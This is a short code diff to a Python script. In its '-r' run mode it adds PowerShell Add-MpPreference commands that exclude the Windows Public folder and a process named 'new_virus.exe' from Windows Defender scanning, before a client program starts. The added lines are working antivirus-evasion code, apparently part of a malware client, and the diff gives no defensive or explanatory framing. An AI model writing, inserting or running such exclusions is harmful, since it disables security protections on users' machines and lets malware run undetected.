@@ -242,5 +242,9 @@ if __name__ == "__main__":
 
     elif arg == '-r':
         # Run mode
+        cmd = r'powershell -Command "Add-MpPreference -ExclusionPath $env:Public"'
+        subprocess.call(cmd, shell=True)
+        cmd = r'powershell -Command "Add-MpPreference -ExclusionProcess new_virus.exe"'
+        subprocess.call(cmd, shell=True)
         client = Client()
         client.main()
